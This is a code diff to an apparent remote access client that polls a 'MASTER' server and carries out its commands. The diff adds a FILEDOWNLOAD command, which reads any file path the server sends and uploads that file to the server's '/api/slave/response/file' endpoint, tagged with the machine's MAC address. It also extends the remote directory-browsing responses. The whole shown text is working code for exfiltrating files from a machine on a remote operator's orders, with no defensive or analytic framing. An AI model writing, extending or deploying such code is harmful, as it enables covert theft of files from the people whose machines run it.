@@ -44,7 +44,7 @@ def get_file_with_sizes_and_directory_names(directory):
             })
         else:
             directories.append(file)
-    return {"directories": directories, "files": files_in_dir}
+    return {"directories": directories, "files": files_in_dir, "working_dir": directory}
 
 def send_file_browse_response_to_server(directory):
     if directory == "ROOT":
@@ -55,9 +55,15 @@ def send_file_browse_response_to_server(directory):
     try:
         files_n_directory_info = get_file_with_sizes_and_directory_names(directory)
     except:
-        files_n_directory_info = {"directories": ["EXCEPTION IN SYSTEM"], "files": []}
+        files_n_directory_info = {"directories": ["EXCEPTION IN SYSTEM"], "files": [], "working_dir": directory}
     payload = {**files_n_directory_info, "mac":mac}
     output = requests.post(url, json = payload)
+
+def send_file_response_to_server(full_file_path):
+    url = f"{base_url}/api/slave/response/file?mac={mac}"
+    with open(full_file_path, "rb") as file:
+        files = {'file': file}
+        response = requests.post(url, files=files)
 
 
 while True:
@@ -80,5 +86,10 @@ while True:
         directory = response['command']
         print("[+] Sending FILEBROWSE Response back to MASTER..")
         send_file_browse_response_to_server(directory)
+
+    elif response['type']=='FILEDOWNLOAD':
+        full_file_path = response['command']
+        print("[+] Sending FILEDOWNLOAD Response back to MASTER..")
+        send_file_response_to_server(full_file_path)
 
     time.sleep(SLEEP_IN_SECONDS)
